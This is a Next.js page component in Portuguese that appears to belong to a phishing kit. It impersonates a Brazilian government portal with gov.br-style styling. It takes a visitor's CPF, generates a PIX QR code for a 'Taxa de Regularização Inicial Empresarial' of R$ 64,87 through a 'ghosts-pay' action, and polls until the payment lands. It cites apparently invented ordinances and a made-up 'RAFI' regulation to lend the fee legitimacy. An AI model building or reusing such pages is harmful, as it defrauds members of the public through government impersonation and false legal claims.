"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Clipboard, Check, Shield, HelpCircle } from "lucide-react"
import { generatePayment, checkPaymentStatus } from "@/actions/ghosts-pay"
import type { PaymentData, VerificationData } from "@/lib/types"
import { ProtocolBadge } from "@/components/protocol-badge"
import { AlertBox } from "@/components/alert-box"
import { LegalReferences } from "@/components/legal-references"

export default function PagamentoPage() {
  const router = useRouter()
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [copied, setCopied] = useState(false)
  const [checkingPayment, setCheckingPayment] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [protocol, setProtocol] = useState("")
  const [showHelp, setShowHelp] = useState(false)
  const [autoCheckActive, setAutoCheckActive] = useState(true)
  const currentDate = new Date().toLocaleDateString("pt-BR")

  useEffect(() => {
    const storedData = sessionStorage.getItem("verificationData")
    const storedProtocol = sessionStorage.getItem("protocol")

    if (!storedData) {
      router.push("/")
      return
    }

    const data = JSON.parse(storedData) as VerificationData
    setVerificationData(data)

    if (storedProtocol) {
      setProtocol(storedProtocol)
    }

    const generateQRCode = async () => {
      try {
        const payment = await generatePayment(data.cpf, 64.87)
        setPaymentData(payment)

        // Armazenar dados de pagamento na sessionStorage
        sessionStorage.setItem("paymentData", JSON.stringify(payment))

        setIsLoading(false)
      } catch (error) {
        console.error("Error generating payment:", error)
        setError("Ocorreu um erro ao gerar o QR Code. Usando dados simulados.")

        // Criar dados de pagamento simulados
        const simulatedPayment: PaymentData = {
          qrCodeUrl: "/qr-code-pix.png",
          qrCodeText:
            "00020101021226580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426655440000520400005303986540564.875802BR5913Simulador PIX6008Brasilia62070503***63041234",
          value: 64.87,
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
          paymentId: `payment-${Date.now()}`,
        }

        setPaymentData(simulatedPayment)
        sessionStorage.setItem("paymentData", JSON.stringify(simulatedPayment))
        setIsLoading(false)
      }
    }

    generateQRCode()
  }, [router])

  // Verificação automática de pagamento a cada 2 segundos
  useEffect(() => {
    if (!paymentData || !autoCheckActive) return

    const interval = setInterval(() => {
      checkPaymentSilently()
    }, 2000)

    return () => clearInterval(interval)
  }, [paymentData, autoCheckActive])

  const copyToClipboard = () => {
    if (paymentData) {
      navigator.clipboard.writeText(paymentData.qrCodeText)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    }
  }

  // Modificar apenas a função checkPaymentSilently para adicionar mais logs
  const checkPaymentSilently = async () => {
    if (!paymentData) return

    try {
      console.log("Verificando pagamento silenciosamente para ID:", paymentData.paymentId)
      const isPaid = await checkPaymentStatus(paymentData.paymentId)
      console.log("Resultado da verificação silenciosa:", isPaid)

      if (isPaid) {
        console.log("Pagamento confirmado! Redirecionando para /confirmacao")
        router.push("/confirmacao")
      } else {
        console.log("Pagamento ainda não confirmado. Continuando verificação em segundo plano.")
      }
    } catch (error) {
      console.error("Error checking payment silently:", error)
      // Não mostrar erro para o usuário na verificação silenciosa
    }
  }

  // Modificar a função checkPayment para adicionar mais logs
  const checkPayment = async () => {
    if (!paymentData || checkingPayment) return

    setCheckingPayment(true)
    setAutoCheckActive(false) // Desativar verificação automática ao clicar no botão

    try {
      console.log("Verificando pagamento manualmente para ID:", paymentData.paymentId)
      const isPaid = await checkPaymentStatus(paymentData.paymentId)
      console.log("Resultado da verificação manual:", isPaid)

      if (isPaid) {
        console.log("Pagamento confirmado! Redirecionando para /confirmacao")
        router.push("/confirmacao")
      } else {
        setCheckingPayment(false)
        console.log("Pagamento não confirmado. Exibindo alerta para o usuário.")
        // Feedback mais claro para o usuário
        alert(
          "Pagamento ainda não identificado. Por favor, aguarde a confirmação do seu pagamento ou verifique se o PIX foi realizado corretamente.",
        )
      }
    } catch (error) {
      console.error("Error checking payment:", error)
      setCheckingPayment(false)
      // Não redirecionar em caso de erro, apenas mostrar mensagem
      alert("Não foi possível verificar o pagamento. Por favor, aguarde alguns instantes e tente novamente.")
    }
  }

  if (!verificationData || isLoading) {
    return (
      <div className="max-w-3xl mx-auto">
        <div className="gov-card text-center">
          <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-6"></div>
          <p className="text-lg font-medium text-gray-700">Gerando QR Code de pagamento...</p>
          <p className="text-sm text-gray-500 mt-2">Aguarde enquanto preparamos sua guia de regularização</p>
        </div>
      </div>
    )
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="gov-card">
        <div className="text-center mb-6">
          <h1 className="gov-heading text-2xl">Taxa de Regularização Inicial Empresarial</h1>
          <ProtocolBadge protocol={protocol} date={currentDate} className="mt-4" />
        </div>

        {error && (
          <AlertBox type="warning" title="Atenção" className="mb-4">
            <p>{error}</p>
          </AlertBox>
        )}

        <div className="space-y-6">
          <div className="bg-green-50 p-4 rounded border border-green-200 text-center">
            <h2 className="text-xl font-semibold text-green-800 mb-2">R$ 64,87</h2>
            <p className="text-sm text-gray-600">Pagamento único com validade de 12 meses</p>
          </div>

          <div className="flex flex-col items-center">
            <div className="bg-white p-4 rounded-lg shadow-sm border border-gray-200 mb-4">
              {paymentData && (
                <div className="relative w-[250px] h-[250px]">
                  {paymentData.qrCodeUrl.startsWith("data:image") ? (
                    <img
                      src={paymentData.qrCodeUrl || "/placeholder.svg"}
                      alt="QR Code PIX"
                      className="w-full h-full object-contain"
                    />
                  ) : (
                    <Image
                      src={paymentData.qrCodeUrl || "/placeholder.svg"}
                      alt="QR Code PIX"
                      width={250}
                      height={250}
                      className="mx-auto"
                    />
                  )}
                </div>
              )}
            </div>

            <div className="w-full max-w-md">
              <div className="flex items-center mb-2">
                <p className="text-sm font-medium text-gray-700">Código PIX Copia e Cola:</p>
                <button
                  onClick={() => setShowHelp(!showHelp)}
                  className="ml-1 text-[#1351b4] hover:text-[#071D41]"
                  title="Ajuda"
                >
                  <HelpCircle size={14} />
                </button>
              </div>
              <div className="flex">
                <div className="flex-1 bg-gray-100 p-2 rounded-l-md text-xs overflow-hidden text-gray-600 font-mono">
                  {paymentData?.qrCodeText.substring(0, 30)}...
                </div>
                <button
                  onClick={copyToClipboard}
                  className="bg-[#1351b4] hover:bg-[#0c326f] text-white px-3 rounded-r-md flex items-center justify-center"
                >
                  {copied ? <Check size={18} /> : <Clipboard size={18} />}
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-1">Clique no botão para copiar o código completo</p>

              {showHelp && (
                <div className="mt-3 bg-[#e5f1ff] p-3 rounded border border-[#c4daff] text-xs text-gray-700">
                  <p className="font-medium text-[#071D41] mb-1">Como usar o Código PIX:</p>
                  <ol className="list-decimal pl-5 space-y-1">
                    <li>Clique no botão ao lado para copiar o código</li>
                    <li>Abra o aplicativo do seu banco</li>
                    <li>Selecione a opção "PIX" ou "Pagar com PIX"</li>
                    <li>Escolha a opção "Copia e Cola" ou "Pix Copia e Cola"</li>
                    <li>Cole o código copiado e confirme o pagamento</li>
                  </ol>
                </div>
              )}
            </div>
          </div>

          <div className="bg-[#e5f1ff] p-4 rounded border border-[#c4daff] text-sm">
            <h3 className="font-medium text-[#071D41] mb-3">Instruções de Pagamento:</h3>
            <ol className="list-decimal pl-5 space-y-2 text-blue-700">
              <li>Abra o aplicativo do seu banco</li>
              <li>Selecione a opção de pagamento via PIX</li>
              <li>Escaneie o QR Code ou cole o código copiado</li>
              <li>Confirme os dados e finalize o pagamento</li>
              <li>Aguarde a confirmação automática nesta página</li>
            </ol>

            <p className="mt-4 pt-4 border-t border-[#c4daff] text-xs flex items-center">
              <Shield size={14} className="mr-1 text-[#1351b4]" />
              Pagamento processado em ambiente seguro com certificação SSL
            </p>
          </div>

          <LegalReferences
            references={[
              "Portaria SEFISC nº 24/2023, Art. 12, Parágrafo 3º",
              "Resolução PGFN/ME nº 101/2024",
              "Art. 7º do Regulamento de Abertura Fiscal Integrada (RAFI)",
            ]}
            linkUrl="/legislacao"
          />

          <div className="flex justify-center mt-4">
            <button
              onClick={checkPayment}
              className="text-[#1351b4] hover:text-[#071D41] text-sm font-medium flex items-center"
              disabled={checkingPayment}
            >
              {checkingPayment ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-2 h-4 w-4 text-[#1351b4]"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Verificando pagamento...
                </>
              ) : (
                "Já realizei o pagamento"
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
